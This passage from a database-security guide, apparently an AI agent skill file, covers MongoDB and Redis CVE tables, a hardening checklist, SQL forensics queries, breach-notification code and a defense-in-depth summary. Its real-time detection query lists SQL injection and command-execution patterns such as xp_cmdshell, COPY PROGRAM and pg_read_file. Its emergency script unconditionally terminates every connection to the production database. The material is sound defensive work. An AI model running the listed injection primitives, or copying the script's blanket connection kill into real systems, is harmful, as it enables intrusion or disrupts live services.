| CVE-2024-1350 | < 7.0.6 | NoSQL injection via `$where` | Update to >= 7.0.6, disable `javascriptEnabled` |
| CVE-2023-3348 | < 6.0.12 | Auth bypass via SCRAM | Update to >= 6.0.12 |
| CVE-2022-0843 | < 5.0.11 | DoS via regex injection | Update to >= 5.0.11 |
| GHSA-3v56-q6r6-4w9c | Mongoose < 6.4.6 | Prototype pollution | Update to >= 6.4.6 |

### 17.4 Redis CVEs

| CVE | Affected | Impact | Mitigation |
|-----|----------|--------|------------|
| CVE-2024-31449 | < 7.2.5 | Lua sandbox escape | Update to >= 7.2.5 |
| CVE-2023-36824 | < 7.2.2 | Command injection via EVAL | Update to >= 7.2.2 |
| CVE-2022-24834 | < 6.2.11 | DoS via EVAL input | Update to >= 6.2.11 |
| CVE-2021-32762 | < 6.2.5 | ACL bypass | Update to >= 6.2.5 |

---

## 18. Implementation Checklist

```
Database Security Implementation Checklist
═══════════════════════════════════════════

Phase 1: Foundation
──────────────────────────────────────────────────
□ 1.1 All SQL queries use parameterized statements
□ 1.2 ORM raw queries reviewed and using safe APIs
□ 1.3 Connection strings in environment variables (not code)
□ 1.4 Database credentials rotated (via vault/secrets manager)
□ 1.5 SSL/TLS enabled with full verification

Phase 2: Access Control
──────────────────────────────────────────────────
□ 2.1 Least privilege roles created (read-only, read-write, admin)
□ 2.2 Application connects with limited service account (not superuser)
□ 2.3 PUBLIC access revoked from all schemas
□ 2.4 Default passwords changed on all accounts
□ 2.5 RLS enabled and tested with edge cases
□ 2.6 pg_hba.conf hardened (scram-sha-256, IP restrictions, cert auth)

Phase 3: Hardening
──────────────────────────────────────────────────
□ 3.1 Network isolation (VPC, security groups, no public access)
□ 3.2 Dangerous extensions disabled (dblink, plperl, plpythonu, xml2)
□ 3.3 Dangerous features disabled (COPY TO PROGRAM, xp_cmdshell)
□ 3.4 Statement timeout configured (30s max)
□ 3.5 Connection limits per user/role
□ 3.6 Max connections set (prevent resource exhaustion)

Phase 4: Encryption
──────────────────────────────────────────────────
□ 4.1 Encryption at rest enabled (TDE or filesystem-level)
□ 4.2 Encryption in transit (TLS 1.2+, secure ciphers)
□ 4.3 Sensitive column encryption (PII, financial data)
□ 4.4 Key management solution implemented (rotation, access control)

Phase 5: Audit & Monitoring
──────────────────────────────────────────────────
□ 5.1 pgaudit extension installed and configured
□ 5.2 Failed login monitoring with alerting
□ 5.3 Slow query logging enabled
□ 5.4 Anomaly detection rules active
□ 5.5 SIEM integration configured
□ 5.6 Database firewall or proxy in place

Phase 6: Backup Security
──────────────────────────────────────────────────
□ 6.1 Backups encrypted at rest
□ 6.2 Backup storage access controlled (IAM, bucket policies)
□ 6.3 Backup integrity verification automated
□ 6.4 Retention policy with secure deletion
□ 6.5 Disaster recovery plan tested

Phase 7: Testing
──────────────────────────────────────────────────
□ 7.1 SQLMap scan clean (no vulnerabilities found)
□ 7.2 NoSQLMap scan clean (MongoDB)
□ 7.3 Static analysis passing (semgrep, CodeQL)
□ 7.4 Integration tests for all injection attack vectors
□ 7.5 DAST scan (OWASP ZAP) clean
□ 7.6 Dependency audit clean (npm audit, grype)

Phase 8: Incident Response
──────────────────────────────────────────────────
□ 8.1 SQL injection detection in real-time
□ 8.2 Blocking mechanism (IP ban, query kill)
□ 8.3 Database forensics procedure documented
□ 8.4 Data breach notification plan (GDPR, CCPA compliance)
□ 8.5 Post-incident review process
```

---

## 19. Emergency Response

### 19.1 Detecting SQL Injection Attacks in Real-Time

```sql
-- Real-time detection query
SELECT
  pid,
  usename,
  application_name,
  client_addr,
  state,
  now() - state_change AS query_duration,
  query
FROM pg_stat_activity
WHERE
  -- Suspicious patterns
  query ILIKE '%UNION%SELECT%'
  OR query ILIKE '%OR 1=1%'
  OR query ILIKE '%AND 1=1%'
  OR query ILIKE '%pg_sleep%'
  OR query ILIKE '%WAITFOR%DELAY%'
  OR query ILIKE '%BENCHMARK%'
  OR query ILIKE '%xp_cmdshell%'
  OR query ILIKE '%COPY%PROGRAM%'
  OR query ILIKE '%LOAD_FILE%'
  OR query ILIKE '%INTO OUTFILE%'
  OR query ILIKE '%INFORMATION_SCHEMA%'
  OR query ILIKE '%information_schema%'
  OR query ILIKE '%dblink%'
  OR query ILIKE '%pg_read_file%'
  OR query ILIKE '%pg_ls_dir%'
  -- Anomalous patterns
  OR (query ILIKE '%SELECT%' AND query ILIKE '%FROM%' AND query_duration > INTERVAL '30 seconds')
  OR (query ILIKE '%DELETE%' AND query ILIKE '%FROM%' AND query_duration > INTERVAL '10 seconds')
  OR (query ILIKE '%DROP%')
  OR (query ILIKE '%TRUNCATE%')
ORDER BY query_duration DESC;
```

### 19.2 Automated Response Script

```bash
#!/bin/bash
# emergency_block.sh — Block suspected SQL injection attacker

ATTACKER_IP=$1
DB_PORT=${2:-5432}
TIMEOUT=${3:-3600}  # 1 hour block

if [ -z "$ATTACKER_IP" ]; then
  echo "Usage: $0 <attacker_ip> [port] [timeout_seconds]"
  exit 1
fi

echo "🚨 EMERGENCY: Blocking $ATTACKER_IP on port $DB_PORT for $TIMEOUT seconds"

# iptables block (Linux)
iptables -A INPUT -s "$ATTACKER_IP" -p tcp --dport "$DB_PORT" -j DROP

# Windows Firewall block (if on Windows)
# netsh advfirewall firewall add rule name="Block Attacker $ATTACKER_IP" \
#   dir=in action=block remoteip="$ATTACKER_IP"

# Kill existing connections from this IP
psql -c "SELECT pg_terminate_backend(pid)
         FROM pg_stat_activity
         WHERE client_addr = '$ATTACKER_IP';"

# Kill idle connections
psql -c "SELECT pg_terminate_backend(pid)
         FROM pg_stat_activity
         WHERE state = 'idle'
           AND state_change < now() - interval '5 minutes';"

# Terminate all connections to the database
psql -c "SELECT pg_terminate_backend(pid)
         FROM pg_stat_activity
         WHERE datname = 'prod';"

echo "Blocked $ATTACKER_IP. Will auto-unblock in $TIMEOUT seconds."

# Schedule unblock
(sleep $TIMEOUT;
 iptables -D INPUT -s "$ATTACKER_IP" -p tcp --dport "$DB_PORT" -j DROP;
 echo "Unblocked $ATTACKER_IP after $TIMEOUT seconds.") &

echo "Response completed."
```

### 19.3 Database Forensics

```sql
-- Step 1: Find what was accessed
SELECT
  query,
  state,
  query_start,
  state_change,
  now() - query_start AS duration,
  client_addr,
  usename
FROM pg_stat_activity
WHERE query_start > now() - interval '24 hours'
ORDER BY query_start DESC;

-- Step 2: Check audit logs for suspicious activity
SELECT
  audit_id,
  event_time,
  session_id,
  user_name,
  database_name,
  object_type,
  object_name,
  command,
  statement
FROM pgaudit.log
WHERE event_time > now() - interval '24 hours'
  AND (
    command IN ('DDL', 'GRANT', 'REVOKE')
    OR statement ILIKE '%SELECT%FROM%users%'
    OR statement ILIKE '%SELECT%FROM%credit_cards%'
    OR statement ILIKE '%UNION%'
  )
ORDER BY event_time DESC;

-- Step 3: Check for data export
SELECT
  query,
  rows,
  query_start
FROM pg_stat_statements
WHERE query ILIKE '%SELECT%FROM%users%'
  AND rows > 100
ORDER BY rows DESC;

-- Step 4: Check superuser activity
SELECT *
FROM pg_stat_activity
WHERE usesuper = true
  AND query_start > now() - interval '24 hours';

-- Step 5: Check for privilege escalation
SELECT
  a.event_time,
  a.user_name,
  a.statement,
  a.object_name
FROM pgaudit.log a
WHERE a.command = 'GRANT'
   OR a.command = 'REVOKE'
   OR a.command = 'ALTER ROLE'
ORDER BY a.event_time DESC;
```

### 19.4 Data Breach Notification Requirements

```typescript
// GDPR Breach Notification Handler
interface DataBreachEvent {
  detectedAt: Date;
  affectedTables: string[];
  affectedRecords: number;
  dataTypes: string[]; // ['PII', 'financial', 'credentials', etc.]
  attackerIP?: string;
  method: string; // 'sqli', 'nosqli', 'brute_force', etc.
  isConfirmed: boolean;
}

async function handleDataBreach(event: DataBreachEvent): Promise<void> {
  // 1. Contain the breach
  await databaseContain(event);
  
  // 2. Assess risk
  const risk = assessRisk(event);
  
  // 3. Notify relevant parties
  if (risk.severity === 'high' || risk.severity === 'critical') {
    // GDPR: Notify supervisory authority within 72 hours
    await notifySupervisoryAuthority({
      breachDescription: `SQL injection attack detected via ${event.method}`,
      affectedRecords: event.affectedRecords,
      dataTypes: event.dataTypes,
      measures: risk.measures,
    });
    
    // GDPR: Notify affected data subjects (if high risk)
    if (risk.requiresNotification) {
      await notifyDataSubjects({
        breachDescription: 'Unauthorized database access',
        affectedDataTypes: event.dataTypes,
        recommendedActions: [
          'Change passwords immediately',
          'Monitor accounts for suspicious activity',
        ],
      });
    }
    
    // CCPA: Notify consumers (California)
    await notifyCCPA();
    
    // PCI-DSS: Notify acquirer/card brands
    if (event.dataTypes.includes('financial')) {
      await notifyPCICompliance();
    }
  }
  
  // 4. Document the breach
  await documentBreach(event, risk);
  
  // 5. Implement preventative measures
  await implementPrevention(event);
}
```

### 19.5 Post-Incident Review Template

```
Post-Incident Security Review
══════════════════════════════

Date of Incident: _____________
Date of Review: _______________
Review Lead: __________________
Team Members: _________________

1. Timeline
   - Initial detection: _________
   - Blocking started: _________
   - Containment achieved: _________
   - Full recovery: _________
   - Total downtime: _________

2. Attack Vector
   - Type: SQLi / NoSQLi / Brute Force / Other: ____
   - Injection point: _________
   - DBMS: _________
   - Tool used (if known): _________

3. Impact Assessment
   - Tables accessed: _________
   - Records exposed: _________
   - Data types exposed: _________
   - Systems affected: _________

4. Root Cause
   - Missing parameterized query? _________
   - ORM raw query bypass? _________
   - Weak authentication? _________
   - Misconfigured firewall? _________
   - Unpatched software? _________

5. Preventative Measures Implemented
   - [ ] Parameterized queries enforced
   - [ ] WAF rules updated
   - [ ] Network isolation improved
   - [ ] Audit logging enhanced
   - [ ] Incident response automated
   - [ ] Team training completed

6. Lessons Learned
   - What went well: _________
   - What could be improved: _________
   - Action items: _________

7. Sign-off
   - Security Team Lead: _________
   - Engineering Lead: _________
   - CISO: _________
```

---

## Summary: Defense-in-Depth Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    DATABASE DEFENSE-IN-DEPTH                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Layer 1: INPUT VALIDATION                                          │
│  ├── Type checking (string, number, UUID, email)                   │
│  ├── Length limits                                                  │
│  ├── Format validation (regex)                                      │
│  └── Allow-list for identifiers and operators                       │
│                                                                     │
│  Layer 2: QUERY PARAMETERIZATION (PRIMARY DEFENSE)                  │
│  ├── Prepared statements for ALL queries                           │
│  ├── ORM safe APIs (no raw string concatenation)                   │
│  └── Stored procedures (with safe parameter patterns)              │
│                                                                     │
│  Layer 3: ACCESS CONTROL                                            │
│  ├── Least privilege roles (read-only, read-write, admin)          │
│  ├── Row-Level Security (RLS) for multi-tenant isolation           │
│  ├── Column-level permissions                                       │
│  └── pg_hba.conf / my.cnf restrictions                             │
│                                                                     │
│  Layer 4: NETWORK SECURITY                                          │
│  ├── VPC / private subnet (no public access)                       │
│  ├── Security groups / firewall rules                               │
│  ├── Bastion host / VPN for admin access                           │
│  └── Database proxy (PgBouncer, ProxySQL)                          │
│                                                                     │
│  Layer 5: ENCRYPTION                                                │
│  ├── TLS 1.2+ for all connections (cert verification)              │
│  ├── TDE / filesystem encryption for data at rest                  │
│  ├── Column-level encryption for sensitive data                    │
│  └── Key management (rotation, HSM or KMS)                         │
│                                                                     │
│  Layer 6: WAF & DATABASE FIREWALL                                   │
│  ├── Web Application Firewall (SQL injection rules)                │
│  ├── Database firewall (ProxySQL, PgBouncer query filtering)       │
│  ├── Rate limiting and anomaly detection                           │
│  └── IP blocking for repeated violations                           │
│                                                                     │
│  Layer 7: AUDIT & MONITORING                                        │
│  ├── pgaudit / audit_log plugin                                    │
│  ├── Slow query logging (SQLi detection)                           │
│  ├── Failed login monitoring                                       │
│  └── SIEM integration (ELK, Splunk, Grafana)                       │
│                                                                     │
│  Layer 8: BACKUP & RECOVERY                                         │
│  ├── Encrypted backups                                              │
│  ├── Access-controlled backup storage                               │
│  ├── Integrity verification                                         │
│  └── Disaster recovery plan                                         │
│                                                                     │
│  Layer 9: INCIDENT RESPONSE                                         │
│  ├── Real-time attack detection                                    │
│  ├── Automated blocking                                            │
│  ├── Database forensics                                            │
│  └── Breach notification procedure                                 │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

> **Next Steps**: Deploy this skill alongside `security-audit` and `database-postgres` for a complete security workflow. Load via `skill({name: "database-security"})`.
